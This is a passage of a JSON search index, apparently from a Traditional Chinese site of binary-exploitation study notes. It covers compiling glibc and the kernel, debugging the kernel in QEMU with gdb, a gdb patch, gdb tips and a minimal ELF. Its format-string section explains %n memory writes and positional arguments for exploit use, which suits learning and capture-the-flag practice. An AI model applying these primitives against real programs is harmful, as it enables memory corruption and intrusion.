https://ftp.gnu.org/gnu/glibc/glibc-2.29.tar.xz x glibc-2.29.tar.xz","title":"\u53d6\u5f97\u539f\u59cb\u78bc"},{"location":"security/pwn/compile-glibc/#_2","text":"64 bit cd glibc-2.29 && mkdir build && cd build CFLAGS = \"-g -g3 -ggdb -gdwarf-4 -Og -w\" \\ CXXFLAGS = \"-g -g3 -ggdb -gdwarf-4 -Og -w\" \\ ../configure --prefix = /path/to/install make -j $( nproc ) && make -j $( nproc ) install 32 bit cd glibc-2.29 && mkdir build32 && cd build32 CC = \"gcc -m32\" CXX = \"g++ -m32\" \\ CFLAGS = \"-g -g3 -ggdb -gdwarf-4 -Og -w\" \\ CXXFLAGS = \"-g -g3 -ggdb -gdwarf-4 -Og -w\" \\ ../configure --prefix = /path/to/install --host = i686-linux-gnu make -j $( nproc ) && make -j $( nproc ) install -j \u591a\u500b\u7a0b\u5e8f\u4e26\u884c\u7de8\u8b6f -w -w \u7684\u4f5c\u7528\u662f\u95dc\u6389\u6240\u6709 warning messages","title":"\u7de8\u8b6f"},{"location":"security/pwn/compile-glibc/#_3","text":"\u96a8\u4fbf\u7de8\u8b6f\u4e00\u500b\u7bc4\u4f8b\u7a0b\u5f0f\uff0c\u770b\u4e00\u4e0b\u4ed6\u7684 process maps \u5c31\u6703\u770b\u5230\u539f\u672c\u7684 libc \u548c ld \u88ab\u63db\u6210\u6211\u5011\u7de8\u8b6f\u7684\u7248\u672c\u4e86 gcc test.c -o test -Wl,-dynamic-linker /path/to/install/lib/ld-2.29.so -Wl,-dynamic-linker -Wl,xxx \u7684\u4f5c\u7528\u662f\u628a\u53c3\u6578 xxx \u50b3\u7d66 linker https://www.youtube.com/watch?v=wsIvqd9YqTI \u21a9 http://look3little.blogspot.com/2017/12/debug-symbolglibc.html \u21a9 https://stackoverflow.com/questions/6562403/i-dont-understand-wl-rpath-wl \u21a9 https://stackoverflow.com/questions/1452671/disable-all-gcc-warnings \u21a9","title":"\u4f7f\u7528"},{"location":"security/pwn/compile-kernel/","text":"\u539f\u59cb\u78bc\u4e0b\u8f09 \u53ef\u4ee5\u5f9e www.kernel.org \u4e0b\u8f09\u6700\u65b0\u7684 kernel ( \u6211\u662f\u4e0b\u8f09 5.0.9 \u7684 ) wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.0.9.tar.xz x linux-5.0.9.tar.xz \u8a2d\u7f6e\u7de8\u8b6f\u53c3\u6578 make menuconfig \u6709\u9078\u55ae\u53ef\u4ee5\u5ba2\u88fd\u5316\uff0c\u9078\u5b8c\u4e4b\u5f8c\u6703\u7522\u751f .config \u7de8\u8b6f make -j $( nproc ) -j \u591a\u500b\u7a0b\u5e8f\u4e26\u884c\u7de8\u8b6f make help \u53ef\u4ee5\u7528 make help \u770b\u770b\u6709\u54ea\u4e9b\u53c3\u6578\u53ef\u4ee5\u7528 \u5b89\u88dd make -j $( nproc ) modules_install \u5b89\u88dd\u5167\u6838\u6a21\u584a ( kernel module ) \u6703\u88dd\u5230 /lib/modules/ make -j $( nproc ) install \u5b89\u88dd\u5167\u6838\u672c\u9ad4 \u6703\u88dd\u5230 /boot \u4e26\u4e14\u6703\u81ea\u52d5\u66f4\u65b0 grub \u4e0b\u6b21\u91cd\u555f\u7cfb\u7d71\u5c31\u6703\u662f\u65b0\u7684\u5167\u6838 \u5b89\u88dd\u5230\u5176\u4ed6\u76ee\u9304 export INSTALL_PATH = /path/to/install https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html \u21a9 https://stackoverflow.com/questions/35931157/change-linux-kernel-installation-directory \u21a9","title":"Compile Kernel"},{"location":"security/pwn/compile-kernel/#_1","text":"\u53ef\u4ee5\u5f9e www.kernel.org \u4e0b\u8f09\u6700\u65b0\u7684 kernel ( \u6211\u662f\u4e0b\u8f09 5.0.9 \u7684 ) wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.0.9.tar.xz x linux-5.0.9.tar.xz","title":"\u539f\u59cb\u78bc\u4e0b\u8f09"},{"location":"security/pwn/compile-kernel/#_2","text":"make menuconfig \u6709\u9078\u55ae\u53ef\u4ee5\u5ba2\u88fd\u5316\uff0c\u9078\u5b8c\u4e4b\u5f8c\u6703\u7522\u751f .config","title":"\u8a2d\u7f6e\u7de8\u8b6f\u53c3\u6578"},{"location":"security/pwn/compile-kernel/#_3","text":"make -j $( nproc ) -j \u591a\u500b\u7a0b\u5e8f\u4e26\u884c\u7de8\u8b6f make help \u53ef\u4ee5\u7528 make help \u770b\u770b\u6709\u54ea\u4e9b\u53c3\u6578\u53ef\u4ee5\u7528","title":"\u7de8\u8b6f"},{"location":"security/pwn/compile-kernel/#_4","text":"make -j $( nproc ) modules_install \u5b89\u88dd\u5167\u6838\u6a21\u584a ( kernel module ) \u6703\u88dd\u5230 /lib/modules/ make -j $( nproc ) install \u5b89\u88dd\u5167\u6838\u672c\u9ad4 \u6703\u88dd\u5230 /boot \u4e26\u4e14\u6703\u81ea\u52d5\u66f4\u65b0 grub \u4e0b\u6b21\u91cd\u555f\u7cfb\u7d71\u5c31\u6703\u662f\u65b0\u7684\u5167\u6838 \u5b89\u88dd\u5230\u5176\u4ed6\u76ee\u9304 export INSTALL_PATH = /path/to/install https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html \u21a9 https://stackoverflow.com/questions/35931157/change-linux-kernel-installation-directory \u21a9","title":"\u5b89\u88dd"},{"location":"security/pwn/debug-kernel/","text":"\u7de8\u8b6f kernel \u53c3\u8003 Compile Kernel initramfs mkdir --parents initramfs/ { bin,dev,etc,lib,lib64,mnt/root,proc,root,sbin,sys } cp ` which busybox ` initramfs/bin/ busybox \u662f\u96c6\u6210\u4e86\u5f88\u591a\u5e38\u7528 linux \u547d\u4ee4\u7684\u5de5\u5177 \u63a5\u4e0b\u4f86\u6211\u5011\u9700\u8981\u7de8\u8f2f\u5169\u500b\u6a94\u6848\uff0c initramfs/init \u548c initramfs/etc/passwd init initramfs/init #!/bin/busybox sh /bin/busybox mkdir -p /usr/sbin /usr/bin /sbin /bin /bin/busybox --install -s mount -t proc none /proc mount -t sysfs none /sys ln -s /dev/console /dev/ttyS0 sleep 2 setsid cttyhack su root poweroff -f kernel \u8dd1\u8d77\u4f86\u7684\u6642\u5019\u6703\u6aa2\u67e5\u662f\u5426\u6709 initramfs\uff0c\u6709\u7684\u8a71\u5c31\u6703\u628a\u5b83 mount \u5728 / \u7136\u5f8c\u8dd1 /init passwd initramfs/etc/passwd root:x:0:0::/root:/bin/sh \u6253\u5305 cd initramfs find . -print0 | cpio --null --create --verbose --format = newc | gzip --best > ../initramfs.cpio.gz qemu-system run.sh #!/bin/bash qemu-system-x86_64 -kernel ./linux-5.0.9/arch/x86_64/boot/bzImage \\ -initrd ./initramfs.cpio.gz \\ -nographic \\ -append \"console=ttyS0 nokaslr\" \\ -gdb tcp:127.0.0.1:7777 nokaslr \u95dc\u6389 kernel \u7684\u4f4d\u5740\u96a8\u6a5f\u5316\uff0c\u65b9\u4fbf\u6211\u5011\u9664\u932f -gdb \u958b\u4e00\u500b gdb server \u8b93\u6211\u5011\u53ef\u4ee5\u9023\u4e0a\u53bb\u9664\u932f \u5982\u4f55\u8df3\u51fa qemu-system Ctrl-A X gdb ( gdb ) target remote :7777 ( gdb ) set auto-load safe-path . ( gdb ) file ./linux-5.0.9/vmlinux ( gdb ) apropos lx # \u986f\u793a\u5305\u542b lx \u7684\u6307\u4ee4 ( \u5f9e vmlinux-gdb.py \u8f09\u5165\u7684\u8f14\u52a9\u51fd\u5f0f ) lx-cmdline -- Report the Linux Commandline used in the current kernel lx-cpus -- List CPU status arrays lx-dmesg -- Print Linux kernel log buffer ... \u56e0\u70ba gdb \u6703\u81ea\u52d5\u8f09\u5165\u4e00\u4e9b\u6a94\u6848\uff0c\u4f46\u6709\u4e9b\u6a94\u6848\u53ef\u80fd\u662f\u4e0d\u53ef\u4fe1\u4efb\u7684 set auto-load safe-path \u5c31\u662f\u8a2d\u5b9a\u53ef\u4ee5\u4fe1\u4efb\u7684\u8def\u5f91\uff0c\u5e95\u4e0b\u7684\u6a94\u6848\u6703\u81ea\u52d5\u8f09\u5165\uff0c\u6bd4\u5982\u8aaa\u4e00\u4e9b python script \u9019\u88e1\u6211\u5011\u8981\u8f09\u5165\u7684\u662f ./linux-5.0.9/vmlinux-gdb.py https://blog.csdn.net/DrottningholmEast/article/details/76651580 \u21a9 https://wiki.gentoo.org/wiki/Custom_Initramfs \u21a9 http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/ \u21a9 https://blog.csdn.net/chrisniu1984/article/details/3907874 \u21a9","title":"Debug Kernel"},{"location":"security/pwn/debug-kernel/#kernel","text":"\u53c3\u8003 Compile Kernel","title":"\u7de8\u8b6f kernel"},{"location":"security/pwn/debug-kernel/#initramfs","text":"mkdir --parents initramfs/ { bin,dev,etc,lib,lib64,mnt/root,proc,root,sbin,sys } cp ` which busybox ` initramfs/bin/ busybox \u662f\u96c6\u6210\u4e86\u5f88\u591a\u5e38\u7528 linux \u547d\u4ee4\u7684\u5de5\u5177 \u63a5\u4e0b\u4f86\u6211\u5011\u9700\u8981\u7de8\u8f2f\u5169\u500b\u6a94\u6848\uff0c initramfs/init \u548c initramfs/etc/passwd","title":"initramfs"},{"location":"security/pwn/debug-kernel/#init","text":"initramfs/init #!/bin/busybox sh /bin/busybox mkdir -p /usr/sbin /usr/bin /sbin /bin /bin/busybox --install -s mount -t proc none /proc mount -t sysfs none /sys ln -s /dev/console /dev/ttyS0 sleep 2 setsid cttyhack su root poweroff -f kernel \u8dd1\u8d77\u4f86\u7684\u6642\u5019\u6703\u6aa2\u67e5\u662f\u5426\u6709 initramfs\uff0c\u6709\u7684\u8a71\u5c31\u6703\u628a\u5b83 mount \u5728 / \u7136\u5f8c\u8dd1 /init","title":"init"},{"location":"security/pwn/debug-kernel/#passwd","text":"initramfs/etc/passwd root:x:0:0::/root:/bin/sh","title":"passwd"},{"location":"security/pwn/debug-kernel/#_1","text":"cd initramfs find . -print0 | cpio --null --create --verbose --format = newc | gzip --best > ../initramfs.cpio.gz","title":"\u6253\u5305"},{"location":"security/pwn/debug-kernel/#qemu-system","text":"run.sh #!/bin/bash qemu-system-x86_64 -kernel ./linux-5.0.9/arch/x86_64/boot/bzImage \\ -initrd ./initramfs.cpio.gz \\ -nographic \\ -append \"console=ttyS0 nokaslr\" \\ -gdb tcp:127.0.0.1:7777 nokaslr \u95dc\u6389 kernel \u7684\u4f4d\u5740\u96a8\u6a5f\u5316\uff0c\u65b9\u4fbf\u6211\u5011\u9664\u932f -gdb \u958b\u4e00\u500b gdb server \u8b93\u6211\u5011\u53ef\u4ee5\u9023\u4e0a\u53bb\u9664\u932f \u5982\u4f55\u8df3\u51fa qemu-system Ctrl-A X","title":"qemu-system"},{"location":"security/pwn/debug-kernel/#gdb","text":"( gdb ) target remote :7777 ( gdb ) set auto-load safe-path . ( gdb ) file ./linux-5.0.9/vmlinux ( gdb ) apropos lx # \u986f\u793a\u5305\u542b lx \u7684\u6307\u4ee4 ( \u5f9e vmlinux-gdb.py \u8f09\u5165\u7684\u8f14\u52a9\u51fd\u5f0f ) lx-cmdline -- Report the Linux Commandline used in the current kernel lx-cpus -- List CPU status arrays lx-dmesg -- Print Linux kernel log buffer ... \u56e0\u70ba gdb \u6703\u81ea\u52d5\u8f09\u5165\u4e00\u4e9b\u6a94\u6848\uff0c\u4f46\u6709\u4e9b\u6a94\u6848\u53ef\u80fd\u662f\u4e0d\u53ef\u4fe1\u4efb\u7684 set auto-load safe-path \u5c31\u662f\u8a2d\u5b9a\u53ef\u4ee5\u4fe1\u4efb\u7684\u8def\u5f91\uff0c\u5e95\u4e0b\u7684\u6a94\u6848\u6703\u81ea\u52d5\u8f09\u5165\uff0c\u6bd4\u5982\u8aaa\u4e00\u4e9b python script \u9019\u88e1\u6211\u5011\u8981\u8f09\u5165\u7684\u662f ./linux-5.0.9/vmlinux-gdb.py https://blog.csdn.net/DrottningholmEast/article/details/76651580 \u21a9 https://wiki.gentoo.org/wiki/Custom_Initramfs \u21a9 http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/ \u21a9 https://blog.csdn.net/chrisniu1984/article/details/3907874 \u21a9","title":"gdb"},{"location":"security/pwn/dynamic-resolver/","text":"patch gdb gdb \u9810\u8a2d\u6703\u8df3\u904e dynamic symbol resolution\uff0c\u6240\u4ee5\u6211\u5011 patch gdb \u7684\u539f\u59cb\u78bc @@ -6536,9 +6536,20 @@ backward through the trampoline code, and that's handled further down, so there is nothing for us to do here. */ + static int env_debug_resolver = -1; + if (env_debug_resolver == -1) { + char *env_debug_resolver_str = getenv(\"DEBUG_RESOLVER\"); + if (env_debug_resolver_str && !strcmp(env_debug_resolver_str, \"1\")) { + env_debug_resolver = 1; + } else { + env_debug_resolver = 0; + } + } + if (execution_direction != EXEC_REVERSE && ecs->event_thread->control.step_over_calls == STEP_OVER_UNDEBUGGABLE - && in_solib_dynsym_resolve_code (ecs->event_thread->suspend.stop_pc)) + && in_solib_dynsym_resolve_code (ecs->event_thread->suspend.stop_pc) + && env_debug_resolver == 0) { CORE_ADDR pc_after_resolver = gdbarch_skip_solib_resolver (gdbarch, \u53d6\u5f97\u539f\u59cb\u78bc ftp.gnu.org wget https://ftp.gnu.org/gnu/gdb/gdb-8.2.1.tar.xz x gdb-8.2.1.tar.xz \u7de8\u8b6f cd gdb-8.2.1 && mkdir build && cd build ../configure --enable-tui --with-python = /usr/bin/python3.6 --prefix = /path/to/install make -j8 && make -j8 install \u4f7f\u7528 export DEBUG_RESOLVER = 1 /path/to/install/bin/gdb https://www.youtube.com/watch?v=wsIvqd9YqTI \u21a9 http://rk700.github.io/2015/08/09/return-to-dl-resolve/ \u21a9","title":"Dynamic Resolver"},{"location":"security/pwn/dynamic-resolver/#patch-gdb","text":"gdb \u9810\u8a2d\u6703\u8df3\u904e dynamic symbol resolution\uff0c\u6240\u4ee5\u6211\u5011 patch gdb \u7684\u539f\u59cb\u78bc @@ -6536,9 +6536,20 @@ backward through the trampoline code, and that's handled further down, so there is nothing for us to do here. */ + static int env_debug_resolver = -1; + if (env_debug_resolver == -1) { + char *env_debug_resolver_str = getenv(\"DEBUG_RESOLVER\"); + if (env_debug_resolver_str && !strcmp(env_debug_resolver_str, \"1\")) { + env_debug_resolver = 1; + } else { + env_debug_resolver = 0; + } + } + if (execution_direction != EXEC_REVERSE && ecs->event_thread->control.step_over_calls == STEP_OVER_UNDEBUGGABLE - && in_solib_dynsym_resolve_code (ecs->event_thread->suspend.stop_pc)) + && in_solib_dynsym_resolve_code (ecs->event_thread->suspend.stop_pc) + && env_debug_resolver == 0) { CORE_ADDR pc_after_resolver = gdbarch_skip_solib_resolver (gdbarch,","title":"patch gdb"},{"location":"security/pwn/dynamic-resolver/#_1","text":"ftp.gnu.org wget https://ftp.gnu.org/gnu/gdb/gdb-8.2.1.tar.xz x gdb-8.2.1.tar.xz","title":"\u53d6\u5f97\u539f\u59cb\u78bc"},{"location":"security/pwn/dynamic-resolver/#_2","text":"cd gdb-8.2.1 && mkdir build && cd build ../configure --enable-tui --with-python = /usr/bin/python3.6 --prefix = /path/to/install make -j8 && make -j8 install","title":"\u7de8\u8b6f"},{"location":"security/pwn/dynamic-resolver/#_3","text":"export DEBUG_RESOLVER = 1 /path/to/install/bin/gdb https://www.youtube.com/watch?v=wsIvqd9YqTI \u21a9 http://rk700.github.io/2015/08/09/return-to-dl-resolve/ \u21a9","title":"\u4f7f\u7528"},{"location":"security/pwn/format-string/","text":"Format String \u9019\u908a\u53ea\u5217\u4e00\u4e9b\u5c0d exploit \u91cd\u8981\u7684\uff0c\u66f4\u591a\u8cc7\u8a0a\u53ef\u4ee5\u53c3\u8003 wikipedia %c %s int width = 5 , garbage ; char ch = 'a' ; // \u57fa\u672c\u6b3e printf ( \"%c \\n \" , ch ); // \u56fa\u5b9a\u9577\u5ea6 padding printf ( \"%10c \\n \" , ch ); // \u52d5\u614b\u9577\u5ea6 padding printf ( \"%*c \\n \" , width , ch ); // \u6307\u5b9a\u53c3\u6578\u4f4d\u7f6e printf ( \"%2$c \\n \" , width , ch ); // \u7d44\u5408\u6280 printf ( \"%3$*2$c \\n \" , garbage , width , ch ); \u8f38\u51fa\u5982\u4e0b a a a a a %c \u5e7e\u4e4e\u7b49\u540c\u65bc %s\uff0c\u53ea\u5dee\u5728 %c \u5370\u4e00\u500b\u5b57 %s \u5370\u5230 '\\x00' \u4e4b\u524d %n int num = 0 , garbage ; // \u5c07\u76ee\u524d\u5370\u51fa\u5b57\u6578\u5beb\u56de\u8b8a\u6578 printf ( \"AAAA%n \\n \" , & num ); printf ( \"num = %d \\n \" , num ); // \u5c07\u76ee\u524d\u5370\u51fa\u5b57\u6578\u5beb\u56de\u6307\u5b9a\u53c3\u6578\u4f4d\u7f6e\u7684\u8b8a\u6578 printf ( \"AAAAAA%2$n \\n \" , garbage , & num ); printf ( \"num = %d \\n \" , num ); \u8f38\u51fa\u5982\u4e0b AAAA num = 4 AAAAAA num = 6 \u683c\u5f0f \u9577\u5ea6 ( bytes ) %lln 8 %n 4 %hn 2 %hhn 1 \u53c3\u6578\u9806\u5e8f For amd64 : rdi is the format ( ex : \"%p\" ) rsi \\to \\to rdx \\to \\to rcx \\to \\to r8 \\to \\to r9 \\to \\to stack _printf_chk \u7576 format string vulnerability \u767c\u751f\u5728 _printf_chk \u5f88\u591a\u6771\u897f\u90fd\u6703\u88ab\u6a94\u6389 %n \u5beb\u503c\u4e0d\u80fd\u7528 %4$p \u6307\u5b9a\u53c3\u6578\u4e5f\u4e0d\u80fd\u7528 tools pwntools \u6709\u5167\u5efa\u7684 format string \u5de5\u5177 fmtstr \u4e5f\u53ef\u4ee5\u7528\u6211\u5beb\u7684\u5de5\u5177 FMT \u56e0\u70ba pwntools \u5167\u5efa\u7684\u5de5\u5177\u6703\u628a address \u653e\u5728\u524d\u9762\u6240\u4ee5\u6709 \\x00 \u5c31\u6703\u88ab\u622a\u65b7\u4e86 \u6240\u4ee5\u6211\u5be6\u4f5c\u7684\u662f\u628a address \u653e\u5728\u5f8c\u9762\u7684 \u81ea\u52d5\u5316\u5de5\u5177\u5927\u591a\u662f\u7528\u5728\u7c21\u55ae\u984c\u4e0a","title":"Format String"},{"location":"security/pwn/format-string/#format-string","text":"\u9019\u908a\u53ea\u5217\u4e00\u4e9b\u5c0d exploit \u91cd\u8981\u7684\uff0c\u66f4\u591a\u8cc7\u8a0a\u53ef\u4ee5\u53c3\u8003 wikipedia","title":"Format String"},{"location":"security/pwn/format-string/#c-s","text":"int width = 5 , garbage ; char ch = 'a' ; // \u57fa\u672c\u6b3e printf ( \"%c \\n \" , ch ); // \u56fa\u5b9a\u9577\u5ea6 padding printf ( \"%10c \\n \" , ch ); // \u52d5\u614b\u9577\u5ea6 padding printf ( \"%*c \\n \" , width , ch ); // \u6307\u5b9a\u53c3\u6578\u4f4d\u7f6e printf ( \"%2$c \\n \" , width , ch ); // \u7d44\u5408\u6280 printf ( \"%3$*2$c \\n \" , garbage , width , ch ); \u8f38\u51fa\u5982\u4e0b a a a a a %c \u5e7e\u4e4e\u7b49\u540c\u65bc %s\uff0c\u53ea\u5dee\u5728 %c \u5370\u4e00\u500b\u5b57 %s \u5370\u5230 '\\x00' \u4e4b\u524d","title":"%c %s"},{"location":"security/pwn/format-string/#n","text":"int num = 0 , garbage ; // \u5c07\u76ee\u524d\u5370\u51fa\u5b57\u6578\u5beb\u56de\u8b8a\u6578 printf ( \"AAAA%n \\n \" , & num ); printf ( \"num = %d \\n \" , num ); // \u5c07\u76ee\u524d\u5370\u51fa\u5b57\u6578\u5beb\u56de\u6307\u5b9a\u53c3\u6578\u4f4d\u7f6e\u7684\u8b8a\u6578 printf ( \"AAAAAA%2$n \\n \" , garbage , & num ); printf ( \"num = %d \\n \" , num ); \u8f38\u51fa\u5982\u4e0b AAAA num = 4 AAAAAA num = 6 \u683c\u5f0f \u9577\u5ea6 ( bytes ) %lln 8 %n 4 %hn 2 %hhn 1","title":"%n"},{"location":"security/pwn/format-string/#_1","text":"For amd64 : rdi is the format ( ex : \"%p\" ) rsi \\to \\to rdx \\to \\to rcx \\to \\to r8 \\to \\to r9 \\to \\to stack","title":"\u53c3\u6578\u9806\u5e8f"},{"location":"security/pwn/format-string/#_printf_chk","text":"\u7576 format string vulnerability \u767c\u751f\u5728 _printf_chk \u5f88\u591a\u6771\u897f\u90fd\u6703\u88ab\u6a94\u6389 %n \u5beb\u503c\u4e0d\u80fd\u7528 %4$p \u6307\u5b9a\u53c3\u6578\u4e5f\u4e0d\u80fd\u7528","title":"_printf_chk"},{"location":"security/pwn/format-string/#tools","text":"pwntools \u6709\u5167\u5efa\u7684 format string \u5de5\u5177 fmtstr \u4e5f\u53ef\u4ee5\u7528\u6211\u5beb\u7684\u5de5\u5177 FMT \u56e0\u70ba pwntools \u5167\u5efa\u7684\u5de5\u5177\u6703\u628a address \u653e\u5728\u524d\u9762\u6240\u4ee5\u6709 \\x00 \u5c31\u6703\u88ab\u622a\u65b7\u4e86 \u6240\u4ee5\u6211\u5be6\u4f5c\u7684\u662f\u628a address \u653e\u5728\u5f8c\u9762\u7684 \u81ea\u52d5\u5316\u5de5\u5177\u5927\u591a\u662f\u7528\u5728\u7c21\u55ae\u984c\u4e0a","title":"tools"},{"location":"security/pwn/gdb-tips/","text":"layout (gdb) layout asm (gdb) layout regs (gdb) layout src ctrl+x+a \u5207\u56de\u6b63\u5e38 print ( gdb ) set print pretty on ( gdb ) print * ( Elf64_Ehdr * ) 0x400000 ( gdb ) print (( Elf64_Phdr * ) 0x400040 )[ 1 ] ( gdb ) print * ( Elf64_Phdr * ) 0x400040 @ 3 // \u4e00\u6b21\u5370\u4e09\u500b macro ( gdb ) info macro ISDIGIT // \u9019\u500b macro \u7684\u5b9a\u7fa9 #define ISDIGIT(Ch) __isdigit_l (Ch, loc) ( gdb ) macro expand ISDIGIT (( UCHAR_T ) * f ) // \u905e\u8ff4\u5c55\u958b\u6240\u6709 macro expands to : ({ int __c = (( unsigned char ) * f ); __c >= '0' && __c <= '9' ; }) starti GDB 8.1 \u7248\u7684\u65b0\u529f\u80fd\uff0c\u958b\u59cb\u57f7\u884c\u4e26\u505c\u5728\u7b2c\u4e00\u500b instruction (gdb) starti startup-with-shell (gdb) run Starting program: ./a.out During startup program terminated with signal SIGSEGV, Segmentation fault. GDB \u9810\u8a2d\u6703\u7528 shell \u628a\u4f60\u7684\u7a0b\u5f0f\u8dd1\u8d77\u4f86\uff0c\u53ef\u80fd\u662f shell \u639b\u6389\uff0c\u4e0d\u662f\u4f60\u7684\u7a0b\u5f0f\u639b\u6389 \u53ef\u4ee5\u628a startup-with-shell \u95dc\u6389\u8a66\u8a66\u770b (gdb) set startup-with-shell off https://sourceware.org/gdb/onlinedocs/gdb/Starting.html \u21a9","title":"GDB \u5c0f\u6280\u5de7"},{"location":"security/pwn/gdb-tips/#layout","text":"(gdb) layout asm (gdb) layout regs (gdb) layout src ctrl+x+a \u5207\u56de\u6b63\u5e38","title":"layout"},{"location":"security/pwn/gdb-tips/#print","text":"( gdb ) set print pretty on ( gdb ) print * ( Elf64_Ehdr * ) 0x400000 ( gdb ) print (( Elf64_Phdr * ) 0x400040 )[ 1 ] ( gdb ) print * ( Elf64_Phdr * ) 0x400040 @ 3 // \u4e00\u6b21\u5370\u4e09\u500b","title":"print"},{"location":"security/pwn/gdb-tips/#macro","text":"( gdb ) info macro ISDIGIT // \u9019\u500b macro \u7684\u5b9a\u7fa9 #define ISDIGIT(Ch) __isdigit_l (Ch, loc) ( gdb ) macro expand ISDIGIT (( UCHAR_T ) * f ) // \u905e\u8ff4\u5c55\u958b\u6240\u6709 macro expands to : ({ int __c = (( unsigned char ) * f ); __c >= '0' && __c <= '9' ; })","title":"macro"},{"location":"security/pwn/gdb-tips/#starti","text":"GDB 8.1 \u7248\u7684\u65b0\u529f\u80fd\uff0c\u958b\u59cb\u57f7\u884c\u4e26\u505c\u5728\u7b2c\u4e00\u500b instruction (gdb) starti","title":"starti"},{"location":"security/pwn/gdb-tips/#startup-with-shell","text":"(gdb) run Starting program: ./a.out During startup program terminated with signal SIGSEGV, Segmentation fault. GDB \u9810\u8a2d\u6703\u7528 shell \u628a\u4f60\u7684\u7a0b\u5f0f\u8dd1\u8d77\u4f86\uff0c\u53ef\u80fd\u662f shell \u639b\u6389\uff0c\u4e0d\u662f\u4f60\u7684\u7a0b\u5f0f\u639b\u6389 \u53ef\u4ee5\u628a startup-with-shell \u95dc\u6389\u8a66\u8a66\u770b (gdb) set startup-with-shell off https://sourceware.org/gdb/onlinedocs/gdb/Starting.html \u21a9","title":"startup-with-shell"},{"location":"security/pwn/minimal-elf/","text":"\u5982\u4f55\u88fd\u9020\u51fa\u6700\u5c0f\u7684\u53ef\u57f7\u884c ELF 64-bit executable \u539f\u59cb\u78bc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 org 0x0000555555554000 ehdr: db 0x7f , \" ELF \" , 2 , 1 , 1 , 0 ; e_ident dq 0 dw 2 ; e_type (EXEC) dw 0x3e ; e_machine (x86_64) dd 1 ; e_version dq _start ; e_entry dq phdr - $$ ; e_phoff dq 0 ; e_shoff dd 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 1 ; e_phnum dw 0 ; e_shentsize dw 0 ; e_shnum dw 0 ; e_shstrndx ehdrsize equ $ - ehdr phdr: dd 1 ; p_type (PT_LOAD) dd 5 ; p_flags dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq filesize ; p_filesz dq filesize ; p_memsz dq 0x1000 ; p_align phdrsize equ $ - phdr _start: mov al , 60 syscall filesize equ $ - $$ $ \u548c $$ \u662f\u4ec0\u9ebc? 1 $ \u4ee3\u8868\u76ee\u524d\u7684\u4f4d\u5740 $$ \u4ee3\u8868\u76ee\u524d section \u958b\u982d\u7684\u4f4d\u5740 ( \u5728\u9019\u500b\u4f8b\u5b50\u662f 0x0000555555554000 ) \u7de8\u8b6f nasm tiny.asm \u89e3\u91cb ELF structure wikipedia \u5beb\u5f97\u5f88\u6e05\u695a \u4e5f\u53ef\u4ee5\u770b\u9019\u500b\u7dda\u4e0a glibc \u7684\u539f\u59cb\u78bc glibc/elf/elf.h \u6216\u662f man page \u4e5f\u6709 man elf \u7b2c\u4e00\u90e8\u5206 : ELF header 1 org 0x0000555555554000 \u6c92\u6709\u958b ASLR \u7684\u6642\u5019\uff0c\u4e00\u822c\u7684 ELF \u90fd\u6703\u5f9e 0x0000555555554000 \u9019\u500b\u4f4d\u5740\u958b\u59cb\uff0c\u6240\u4ee5\u6211\u5011\u4e5f\u5f9e\u9019\u500b\u4f4d\u5740\u958b\u59cb 4 5 db 0x7f , \" ELF \" , 2 , 1 , 1 , 0 ; e_ident dq 0 \u6bd4\u8f03\u91cd\u8981\u7684\u5c31\u662f\u90a3\u500b 2 \u4ee3\u8868 64-bit \u5269\u4e0b\u7684\u5c31\u4e0d\u592a\u91cd\u8981\u4e86\uff0c\u53ef\u4ee5\u5ffd\u7565\u4e0d\u770b \u5176\u5be6\u4e5f\u5c31\u662f\u7de8\u4e00\u500b\u6b63\u5e38\u7684 ELF 64-bit executable \u53c3\u8003\u4e00\u4e0b 9 dq _start ; e_entry \u9019\u88e1\u8981\u586b\u7684\u662f\u7a0b\u5f0f\u7684\u5165\u53e3\u9ede\uff0c\u4e5f\u5c31\u662f\u6211\u5011\u5b9a\u7fa9\u7684 _start 10 11 dq phdr - $$ ; e_phoff dq 0 ; e_shoff \u56e0\u70ba secion header table \u5728\u57f7\u884c\u7684\u6642\u5019\u4e0d\u6703\u7528\u5230\uff0c\u6240\u4ee5\u6211\u5011\u53ea\u8981\u69cb\u9020 program header table \u6240\u4ee5 section header table \u7684 offset \u5c31\u586b 0 \u5c31\u597d \u7b2c\u4e8c\u90e8\u5206 : program header table 24 dd 5 ; p_flags \u9019\u88e1\u586b 5 \u4ee3\u8868\u9019\u500b\u6bb5\u53ef\u8b80\u53ef\u57f7\u884c\uff0c\u9019\u6a23\u6211\u5011\u7684\u4e0b\u9762\u7684 _start \u624d\u53ef\u4ee5\u57f7\u884c 25 26 27 dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr \u56e0\u70ba\u7e3d\u5171\u5c31\u53ea\u6709\u4e00\u500b\u6bb5\uff0c\u5305\u542b\u4e86\u6574\u500b\u6a94\u6848\u9023\u540c\u524d\u9762\u7684 ELF header \u548c\u5f8c\u9762\u7684 _start \u4e00\u8d77\uff0c\u6240\u4ee5\u6bb5\u7684\u958b\u982d\u5728 ELF header \u7684\u958b\u982d p_offset \u662f\u6307\u9019\u500b\u6bb5\u5728\u6a94\u6848\u4e2d\u7684\u504f\u79fb\uff0c\u6240\u4ee5\u662f 0 p_vaddr \u662f\u6307\u9019\u500b\u6bb5\u5728\u8a18\u61b6\u9ad4\u4e2d\u7684\u4f4d\u5740\uff0c\u6240\u4ee5\u662f $$ p_paddr \u57fa\u672c\u4e0a\u8ddf p_vaddr \u4e00\u6a23 \u7b2c\u4e09\u90e8\u5206 : assembly code 34 35 36 _start: mov al , 60 syscall \u9019\u88e1\u5c31\u662f\u53eb sys_exit \u8b93\u7a0b\u5f0f\u6b63\u5e38\u7d50\u675f \u4e00\u822c\u4e0d\u6703\u7279\u5225\u9700\u8981\u5728\u7a0b\u5f0f\u7d50\u675f\u7684\u6642\u5019\u5beb sys_exit 